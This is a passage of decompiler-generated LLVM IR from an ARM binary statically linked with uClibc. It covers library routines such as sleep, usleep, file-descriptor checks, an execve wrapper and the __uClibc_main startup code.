  %v0_134b8 = phi i32 [ %v1_134b8, %dec_label_pc_134a4 ], [ 0, %entry ]
  %v3_134a4 = phi i32 [ %v1_134ac, %dec_label_pc_134a4 ], [ %v2_13498, %entry ]
  %v1_134a8 = inttoptr i32 %v3_134a4 to i32*
  %v2_134a8 = load i32, i32* %v1_134a8, align 4
  %v1_134ac = add i32 %v3_134a4, 4
  %v2_134b0 = icmp eq i32 %v2_134a8, 0
  store i32 %v1_134ac, i32* %stack_var_-32, align 4
  %v1_134b8 = add i32 %v0_134b8, 1
  store i32 %v1_134b8, i32* @lr, align 4
  br i1 %v2_134b0, label %dec_label_pc_134c0, label %dec_label_pc_134a4

dec_label_pc_134c0:                               ; preds = %dec_label_pc_134a4
  %v3_134c0.neg = mul i32 %v1_134b8, -4
  %v1_134c4.neg = add i32 %v2_13494, -8
  %v2_134c8 = add i32 %v1_134c4.neg, %v3_134c0.neg
  %v2_134d0 = inttoptr i32 %v2_134c8 to i32*
  store i32 %arg1, i32* %v2_134d0, align 4
  store i32 %v2_13498, i32* %stack_var_-32, align 4
  %v0_134dc = load i32, i32* @sp, align 4
  store i32 %v0_134dc, i32* @r1, align 4
  store i32 %v0_134dc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_134e4

dec_label_pc_134e4:                               ; preds = %dec_label_pc_134e4.dec_label_pc_134e4_crit_edge, %dec_label_pc_134c0
  %v1_134f8 = phi i32 [ %v5_134f8, %dec_label_pc_134e4.dec_label_pc_134e4_crit_edge ], [ %v0_134dc, %dec_label_pc_134c0 ]
  %v3_134e4 = phi i32 [ %v3_134e4.pre, %dec_label_pc_134e4.dec_label_pc_134e4_crit_edge ], [ %v2_13498, %dec_label_pc_134c0 ]
  %v1_134e8 = inttoptr i32 %v3_134e4 to i32*
  %v2_134e8 = load i32, i32* %v1_134e8, align 4
  %v0_134ec = load i32, i32* @lr, align 4
  %v1_134ec = add i32 %v0_134ec, -1
  store i32 %v1_134ec, i32* @lr, align 4
  %v7_134ec = icmp eq i32 %v0_134ec, 1
  %v1_134f0 = add i32 %v3_134e4, 4
  store i32 %v1_134f0, i32* %stack_var_-32, align 4
  %v2_134f8 = add i32 %v1_134f8, 4
  %v3_134f8 = inttoptr i32 %v2_134f8 to i32*
  store i32 %v2_134e8, i32* %v3_134f8, align 4
  %v4_134f8 = load i32, i32* %ip.global-to-local, align 4
  %v5_134f8 = add i32 %v4_134f8, 4
  store i32 %v5_134f8, i32* %ip.global-to-local, align 4
  br i1 %v7_134ec, label %dec_label_pc_13500, label %dec_label_pc_134e4.dec_label_pc_134e4_crit_edge

dec_label_pc_134e4.dec_label_pc_134e4_crit_edge:  ; preds = %dec_label_pc_134e4
  %v3_134e4.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_134e4

dec_label_pc_13500:                               ; preds = %dec_label_pc_134e4
  %v2_13504 = load i32, i32* @global_var_2a3b4.804, align 4
  store i32 %v2_13504, i32* @r2, align 4
  %v0_13508 = call i32 @__GI_execve()
  ret i32 %v0_13508

; uselistorder directives
  uselistorder i32 %v5_134f8, { 1, 0 }
  uselistorder i32 %v0_134ec, { 1, 0 }
  uselistorder i32 %v1_134b8, { 0, 2, 1 }
  uselistorder i32 %v1_134ac, { 1, 0 }
  uselistorder i32 %v3_134a4, { 1, 0 }
  uselistorder i32 %v2_13498, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_13518 = load i32, i32* @r4, align 4
  store i32 %v3_13518, i32* %stack_var_-20, align 4
  %v6_13518 = load i32, i32* @r5, align 4
  %v9_13518 = load i32, i32* @r6, align 4
  %v16_13518 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %ip.global-to-local, align 4
  %v2_1351c = icmp eq i32 %arg1, 0
  %v2_13520 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_1351c, label %dec_label_pc_136a4, label %dec_label_pc_13538.preheader

dec_label_pc_13538.preheader:                     ; preds = %entry
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_1354017 = add i32 %v16_13518, 124
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %dec_label_pc_13538.preheader, %dec_label_pc_13530
  %v5_1354018 = phi i32 [ %v5_1354017, %dec_label_pc_13538.preheader ], [ %v5_13540, %dec_label_pc_13530 ]
  %v2_13534 = add i32 %v5_1354018, -136
  %v3_13534 = inttoptr i32 %v2_13534 to i32*
  store i32 0, i32* %v3_13534, align 4
  %v0_13538.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_13538 = add i32 %v0_13538.pre, -1
  store i32 %v1_13538, i32* %r1.global-to-local, align 4
  %v6_13538 = icmp slt i32 %v1_13538, 0
  %v4_13540 = mul i32 %v1_13538, 4
  %v5_13540 = add i32 %v4_13540, %v16_13518
  br i1 %v6_13538, label %dec_label_pc_13548, label %dec_label_pc_13530

dec_label_pc_13548:                               ; preds = %dec_label_pc_13530
  %v2_13548 = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_13548, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_13558 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_13558, i32* %stack_var_-28, align 4
  %v0_13560 = call i32 @__sigaddset()
  store i32 %v0_13560, i32* %r0.global-to-local, align 4
  %v1_13564 = load i32, i32* @r5, align 4
  %v5_13568 = icmp slt i32 %v0_13560, %v1_13564
  br i1 %v5_13568, label %dec_label_pc_136ac, label %dec_label_pc_1356c

dec_label_pc_1356c:                               ; preds = %dec_label_pc_13548
  %v2_1356c = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_1356c, i32* @r4, align 4
  store i32 %v1_13564, i32* %r0.global-to-local, align 4
  store i32 %v2_13548, i32* %r1.global-to-local, align 4
  %v3_1357c = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_1357c = call i32 @__GI_sigprocmask(i32 %v1_13564, %_TYPEDEF_sigset_t* %v3_1357c, i32 %v2_1356c)
  store i32 %v4_1357c, i32* %r0.global-to-local, align 4
  %v1_13580 = load i32, i32* @r5, align 4
  %v9_13580 = icmp eq i32 %v4_1357c, %v1_13580
  br i1 %v9_13580, label %dec_label_pc_13588, label %dec_label_pc_136ac

dec_label_pc_13588:                               ; preds = %dec_label_pc_1356c
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_1356c, i32* %r0.global-to-local, align 4
  %v2_13590 = call i32 @__sigismember(i32 %v2_1356c, i32 17)
  store i32 %v2_13590, i32* %r0.global-to-local, align 4
  %v1_13594 = load i32, i32* @r5, align 4
  %v9_13594 = icmp eq i32 %v2_13590, %v1_13594
  br i1 %v9_13594, label %dec_label_pc_135ac.preheader, label %dec_label_pc_13588.dec_label_pc_13674_crit_edge

dec_label_pc_13588.dec_label_pc_13674_crit_edge:  ; preds = %dec_label_pc_13588
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_13674

dec_label_pc_135ac.preheader:                     ; preds = %dec_label_pc_13588
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_135a4

dec_label_pc_135a4:                               ; preds = %dec_label_pc_135ac.preheader, %dec_label_pc_135a4
  %v5_135b416 = phi i32 [ %v5_1354017, %dec_label_pc_135ac.preheader ], [ %v5_135b4, %dec_label_pc_135a4 ]
  %v2_135a8 = add i32 %v5_135b416, -136
  %v3_135a8 = inttoptr i32 %v2_135a8 to i32*
  store i32 0, i32* %v3_135a8, align 4
  %v0_135ac.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_135ac = add i32 %v0_135ac.pre, -1
  store i32 %v1_135ac, i32* %r1.global-to-local, align 4
  %v6_135ac = icmp slt i32 %v1_135ac, 0
  %v4_135b4 = mul i32 %v1_135ac, 4
  %v5_135b4 = add i32 %v4_135b4, %v16_13518
  br i1 %v6_135ac, label %dec_label_pc_135bc, label %dec_label_pc_135a4

dec_label_pc_135bc:                               ; preds = %dec_label_pc_135a4
  store i32 %v2_13548, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_135c4 = call i32 @__sigaddset()
  store i32 %v0_135c4, i32* %r0.global-to-local, align 4
  %v1_135c8 = icmp slt i32 %v0_135c4, 0
  br i1 %v1_135c8, label %dec_label_pc_136ac, label %dec_label_pc_135d0

dec_label_pc_135d0:                               ; preds = %dec_label_pc_135bc
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_135dc = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_13520)
  store i32 %v4_135dc, i32* %r0.global-to-local, align 4
  %v1_135e0 = icmp slt i32 %v4_135dc, 0
  br i1 %v1_135e0, label %dec_label_pc_135e8, label %dec_label_pc_13610

dec_label_pc_135e8:                               ; preds = %dec_label_pc_135d0
  %v0_135e8 = call i32 @__errno_location()
  store i32 %v2_1356c, i32* %r1.global-to-local, align 4
  store i32 %v0_135e8, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_135fc = inttoptr i32 %v0_135e8 to i32*
  %v2_135fc = load i32, i32* %v1_135fc, align 4
  store i32 %v2_135fc, i32* @r4, align 4
  %v3_13600 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13600 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_13600, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_13608 = load i32, i32* @r4, align 4
  %v1_13608 = load i32, i32* %r5.global-to-local, align 4
  %v2_13608 = inttoptr i32 %v1_13608 to i32*
  store i32 %v0_13608, i32* %v2_13608, align 4
  %v17_136b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136b0

dec_label_pc_13610:                               ; preds = %dec_label_pc_135d0
  %v2_13610 = load i32, i32* %stack_var_-424, align 4
  %v7_13614 = icmp eq i32 %v2_13610, 1
  %v2_1361c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1361c, i32* @r4, align 4
  br i1 %v7_13614, label %dec_label_pc_13624, label %dec_label_pc_13658

dec_label_pc_13624:                               ; preds = %dec_label_pc_13610
  store i32 %v2_1361c, i32* %r1.global-to-local, align 4
  store i32 %v2_1361c, i32* %r0.global-to-local, align 4
  %v2_1362c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1362c = call i32 @__libc_nanosleep(%timespec* %v2_1362c, i32 %v2_1361c)
  store i32 %v3_1362c, i32* %r0.global-to-local, align 4
  store i32 %v3_1362c, i32* %r6.global-to-local, align 4
  %v0_13634 = call i32 @__errno_location()
  store i32 %v2_1356c, i32* %r1.global-to-local, align 4
  store i32 %v0_13634, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_13648 = inttoptr i32 %v0_13634 to i32*
  %v2_13648 = load i32, i32* %v1_13648, align 4
  store i32 %v2_13648, i32* @r4, align 4
  %v3_1364c = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_1364c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_1364c, i32 0)
  store i32 %v4_1364c, i32* %r0.global-to-local, align 4
  %v0_13650 = load i32, i32* @r4, align 4
  %v1_13650 = load i32, i32* %r5.global-to-local, align 4
  %v2_13650 = inttoptr i32 %v1_13650 to i32*
  store i32 %v0_13650, i32* %v2_13650, align 4
  %v0_13680.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13680

dec_label_pc_13658:                               ; preds = %dec_label_pc_13610
  store i32 %v2_1356c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_13664 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13664 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_13664, i32 0)
  store i32 %v4_13664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13674

dec_label_pc_13674:                               ; preds = %dec_label_pc_13588.dec_label_pc_13674_crit_edge, %dec_label_pc_13658
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_13588.dec_label_pc_13674_crit_edge ], [ %v2_1361c, %dec_label_pc_13658 ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_13678 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_13678 = call i32 @__libc_nanosleep(%timespec* %v2_13678, i32 %storemerge.pre-phi)
  store i32 %v3_13678, i32* %r0.global-to-local, align 4
  store i32 %v3_13678, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13680

dec_label_pc_13680:                               ; preds = %dec_label_pc_13624, %dec_label_pc_13674
  %v0_13680 = phi i32 [ %v0_13680.pr, %dec_label_pc_13624 ], [ %v3_13678, %dec_label_pc_13674 ]
  %v2_13680 = icmp eq i32 %v0_13680, 0
  br i1 %v2_13680, label %dec_label_pc_136a4, label %dec_label_pc_13688

dec_label_pc_13688:                               ; preds = %dec_label_pc_13680
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_13690 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_13690, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136b0

dec_label_pc_136a4:                               ; preds = %entry, %dec_label_pc_13680
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136b0

dec_label_pc_136ac:                               ; preds = %dec_label_pc_1356c, %dec_label_pc_135bc, %dec_label_pc_13548
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_136b0

dec_label_pc_136b0:                               ; preds = %dec_label_pc_13688, %dec_label_pc_136a4, %dec_label_pc_135e8, %dec_label_pc_136ac
  %v17_136b4 = phi i32 [ %v3_13690, %dec_label_pc_13688 ], [ 0, %dec_label_pc_136a4 ], [ %v17_136b4.pre, %dec_label_pc_135e8 ], [ -1, %dec_label_pc_136ac ]
  %v2_136b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_136b4, i32* @r4, align 4
  store i32 %v6_13518, i32* @r5, align 4
  store i32 %v9_13518, i32* @r6, align 4
  ret i32 %v17_136b4

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_1361c, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_135ac, { 0, 2, 1 }
  uselistorder i32 %v2_1356c, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_13564, { 1, 0, 2 }
  uselistorder i32 %v1_13538, { 0, 2, 1 }
  uselistorder i32 %v16_13518, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 1, 7, 6, 9, 8, 11, 10, 13, 14, 12, 16, 15, 17, 19, 18, 21, 20, 22, 0 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 ()* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 -136, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_136b0, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_136ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_136a4, { 1, 0 }
  uselistorder label %dec_label_pc_13680, { 1, 0 }
  uselistorder label %dec_label_pc_13674, { 1, 0 }
  uselistorder label %dec_label_pc_135a4, { 1, 0 }
  uselistorder label %dec_label_pc_13530, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_136bc = load i32, i32* @r4, align 4
  store i32 1000000, i32* @r4, align 4
  %v2_136d0 = udiv i32 %arg1, 1000000
  store i32 %v2_136d0, i32* %stack_var_-20, align 4
  %v2_136f8 = bitcast i32* %stack_var_-20 to %timespec*
  %v3_136f8 = call i32 @__libc_nanosleep(%timespec* %v2_136f8, i32 0)
  store i32 %v3_136bc, i32* @r4, align 4
  ret i32 %v3_136f8

; uselistorder directives
  uselistorder i32 (%timespec*, i32)* @__libc_nanosleep, { 2, 0, 1 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_13734:
  %stack_var_-8 = alloca i32, align 4
  %v3_13708 = load i32, i32* @r4, align 4
  store i32 %v3_13708, i32* %stack_var_-8, align 4
  %v2_13738 = load i32, i32* @global_var_2a3bc.811, align 4
  %v2_1373c = icmp eq i32 %v2_13738, 0
  br i1 %v2_1373c, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_13734
  call void @__pseudo_branch(i32 %v2_13738)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13734, %bb
  %v2_1374c = load i32, i32* @global_var_2a3c0.813, align 4
  %v2_13750 = icmp eq i32 %v2_1374c, 0
  br i1 %v2_13750, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_13754 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_13754, i32* @r4, align 4
  %v9_13754 = load i32, i32* @r0, align 4
  ret i32 %v9_13754

bb13:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_1374c)
  %v2_13760 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_13760, i32* @r4, align 4
  %v8_13760 = load i32, i32* @r0, align 4
  ret i32 %v8_13760

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v1_1377c = load i32, i32* @r0, align 4
  ret i32 %v1_1377c
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_13780 = load i32, i32* @r4, align 4
  store i32 %v3_13780, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_13790 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_13794 = icmp eq i32 %v2_13790, -1
  br i1 %v7_13794, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_13798 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_13798, i32* @r4, align 4
  ret i32 %v2_13790

bb4:                                              ; preds = %entry
  %v0_1379c = load i32, i32* @r4, align 4
  %v4_137a4 = call i32 @__libc_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_1ac80.816, i32 0, i32 0), i32 %v0_1379c)
  %v1_137a8 = load i32, i32* %r5.global-to-local, align 4
  %v9_137a8 = icmp eq i32 %v4_137a4, %v1_137a8
  br i1 %v9_137a8, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_137ac = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_137ac, i32* @r4, align 4
  ret i32 %v4_137a4

bb6:                                              ; preds = %bb4
  %v0_137b0 = call i32 @abort()
  %v0_137b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_137b4, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_137b0

; uselistorder directives
  uselistorder i32 %v2_13790, { 1, 0 }
  uselistorder i32 ()* @abort, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @__libc_open, { 3, 2, 0, 1 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 0, 5, 9, 8, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_137bc = load i32, i32* @global_var_2a3c4.818, align 4
  %v2_137c0 = icmp eq i32 %v2_137bc, 0
  br i1 %v2_137c0, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v6_137cc = load i32, i32* @r0, align 4
  ret i32 %v6_137cc

bb3:                                              ; preds = %entry
  store i32 1, i32* @global_var_2a3c4.818, align 4
  store i32 4096, i32* @global_var_2a3b8.578, align 4
  %v0_13800 = call i32 @_stdio_init()
  ret i32 %v0_13800
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v4_13818 = mul i32 %arg2, 4
  %v5_13818 = add i32 %tmp, %v4_13818
  %v2_1381c = load i32, i32* %arg3, align 4
  %v2_13820 = ptrtoint i32* %stack_var_-120 to i32
  %v1_13824 = add i32 %v5_13818, 4
  store i32 %v1_13824, i32* @ip, align 4
  %v9_13828 = icmp eq i32 %v1_13824, %v2_1381c
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg7, i32* @global_var_2a3b0.824, align 4
  store i32 %v1_13824, i32* @global_var_2a3b4.804, align 4
  store i32 %arg6, i32* @global_var_2a3c0.813, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_13828, label %bb, label %bb41

bb:                                               ; preds = %entry
  store i32 %v5_13818, i32* @global_var_2a3b4.804, align 4
  br label %bb41

bb41:                                             ; preds = %entry, %bb
  store i32 %arg4, i32* @r7, align 4
  %v2_13868 = bitcast i32* %stack_var_-120 to i8*
  %v3_13868 = call i32 @__GI_memset(i8* %v2_13868, i32 0)
  %storemerge.pre = load i32, i32* @global_var_2a3b4.804, align 4
  br label %dec_label_pc_13878

dec_label_pc_13878:                               ; preds = %dec_label_pc_13878, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_13878, %dec_label_pc_13878 ]
  %v1_13878 = inttoptr i32 %storemerge to i32*
  %v2_13878 = load i32, i32* %v1_13878, align 4
  %v4_13878 = add i32 %storemerge, 4
  %v2_1387c = icmp eq i32 %v2_13878, 0
  br i1 %v2_1387c, label %dec_label_pc_13888, label %dec_label_pc_13878

dec_label_pc_13888:                               ; preds = %dec_label_pc_13878
  store i32 %v4_13878, i32* @r4, align 4
  %v1_138a822 = inttoptr i32 %v4_13878 to i32*
  %v2_138a823 = load i32, i32* %v1_138a822, align 4
  %v2_138ac25 = icmp eq i32 %v2_138a823, 0
  br i1 %v2_138ac25, label %dec_label_pc_138b4, label %dec_label_pc_13890

dec_label_pc_13890:                               ; preds = %dec_label_pc_13888, %dec_label_pc_138a8
  %v5_13894 = phi i32 [ %v2_138a8, %dec_label_pc_138a8 ], [ %v2_138a823, %dec_label_pc_13888 ]
  %v2_13890 = icmp ugt i32 %v5_13894, 13
  %v7_13890 = icmp eq i32 %v5_13894, 14
  %v2_13894 = xor i1 %v2_13890, true
  %v3_13894 = or i1 %v7_13890, %v2_13894
  br i1 %v3_13894, label %bb42, label %bb43

bb42:                                             ; preds = %dec_label_pc_13890
  %v6_13894 = and i32 %v5_13894, 536870912
  %v7_13894 = icmp ne i32 %v6_13894, 0
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_13890, %bb42
  %v1_138a0 = phi i1 [ %v2_13890, %dec_label_pc_13890 ], [ %v7_13894, %bb42 ]
  %v2_13898 = xor i1 %v1_138a0, true
  %v3_13898 = or i1 %v7_13890, %v2_13898
  br i1 %v3_13898, label %bb44, label %dec_label_pc_138a8

bb44:                                             ; preds = %bb43
  br label %dec_label_pc_138a8

dec_label_pc_138a8:                               ; preds = %bb43, %bb44
  call void @__pseudo_cond_branch(i1 %v3_13898, i32 ptrtoint (i32* @global_var_11710.827 to i32))
  %v0_138a4 = load i32, i32* @r4, align 4
  %v1_138a4 = add i32 %v0_138a4, 8
  store i32 %v1_138a4, i32* @r4, align 4
  %v1_138a8 = inttoptr i32 %v1_138a4 to i32*
  %v2_138a8 = load i32, i32* %v1_138a8, align 4
  %v2_138ac = icmp eq i32 %v2_138a8, 0
  br i1 %v2_138ac, label %dec_label_pc_138b4, label %dec_label_pc_13890

dec_label_pc_138b4:                               ; preds = %dec_label_pc_138a8, %dec_label_pc_13888
  %v1_138b8 = call i32 @_dl_aux_init(i32 %v2_13820)
  store i32 %v1_138b8, i32* @r0, align 4
  %v1_138bc = call i32 @__GI___uClibc_init(i32 %v1_138b8)
  store i32 %v1_138bc, i32* @r0, align 4
  %v2_138c8 = icmp eq i32 %tmp37, 0
  br i1 %v2_138c8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_138b4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_138b4, %bb45
  %v0_138d8 = phi i32 [ %tmp37, %dec_label_pc_138b4 ], [ 4096, %bb45 ]
  %v3_138d0 = icmp eq i32 %tmp36, -1
  %v8_138d0 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_2a3b8.578 to i32), i32* @r2, align 4
  store i32 %v0_138d8, i32* @global_var_2a3b8.578, align 4
  br i1 %v3_138d0, label %dec_label_pc_138e0, label %dec_label_pc_13908

dec_label_pc_138e0:                               ; preds = %bb46
  %v0_138e0 = call i32 @getuid()
  store i32 %v0_138e0, i32* @r0, align 4
  store i32 %v0_138e0, i32* @r4, align 4
  %v0_138e8 = call i32 @geteuid()
  %v0_138ec = load i32, i32* @r4, align 4
  %v9_138ec = icmp eq i32 %v0_138ec, %v0_138e8
  br i1 %v9_138ec, label %dec_label_pc_138f4, label %dec_label_pc_13930

dec_label_pc_138f4:                               ; preds = %dec_label_pc_138e0
  %v1_138f4 = call i32 @getgid(i32 %v0_138e8)
  store i32 %v1_138f4, i32* @r0, align 4
  store i32 %v1_138f4, i32* @r4, align 4
  %v0_138fc = call i32 @getegid()
  %v0_13900 = load i32, i32* @r4, align 4
  %v9_13900 = icmp eq i32 %v0_13900, %v0_138fc
  br i1 %v9_13900, label %dec_label_pc_13908, label %dec_label_pc_13930

dec_label_pc_13908:                               ; preds = %dec_label_pc_138f4, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_138d0, label %dec_label_pc_1399c, label %dec_label_pc_13914

dec_label_pc_13914:                               ; preds = %dec_label_pc_13908
  %v9_13918 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_13918, label %dec_label_pc_13920, label %dec_label_pc_13930

dec_label_pc_13920:                               ; preds = %dec_label_pc_13914
  br label %dec_label_pc_13930

dec_label_pc_13930:                               ; preds = %dec_label_pc_13920, %dec_label_pc_13914, %dec_label_pc_138f4, %dec_label_pc_138e0
  %v2_13938 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_13944 = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_13950 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_1399c

dec_label_pc_1399c:                               ; preds = %dec_label_pc_13930, %dec_label_pc_13908
  %v0_13960 = load i32, i32* @r6, align 4
  %v1_13960 = inttoptr i32 %v0_13960 to i32*
  %v2_13960 = load i32, i32* %v1_13960, align 4
  store i32 %v2_13960, i32* @global_var_24128, align 4
  store i32 %arg5, i32* @global_var_2a3bc.811, align 4
  %v2_1399c = icmp eq i32 %arg4, 0
  br i1 %v2_1399c, label %dec_label_pc_139d8, label %bb47

bb47:                                             ; preds = %dec_label_pc_1399c
  br label %dec_label_pc_139d8

dec_label_pc_139d8:                               ; preds = %dec_label_pc_1399c, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_139e8 = call i32 @__errno_location()
  %v2_139f0 = inttoptr i32 %v1_139e8 to i32*
  store i32 0, i32* %v2_139f0, align 4
  %v1_13a04 = call i32 @__GI___h_errno_location()
  %v2_13a0c = inttoptr i32 %v1_13a04 to i32*
  store i32 0, i32* %v2_13a0c, align 4
  %v0_13a1c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_13a28 = call i32 @__GI_exit(i32 %v0_13a1c)
  ret i32 %v1_13a28

; uselistorder directives
  uselistorder i32 %v2_138a8, { 1, 0 }
  uselistorder i32 %v1_138a4, { 1, 0 }
  uselistorder i1 %v2_13890, { 1, 0 }
  uselistorder i32 %v4_13878, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 5, 1, 2, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32* @global_var_2a3b8.578, { 1, 5, 0, 2, 3, 4 }
  uselistorder i32 4096, { 2, 3, 13, 6, 14, 4, 1, 10, 5, 7, 8, 11, 12, 0, 9 }
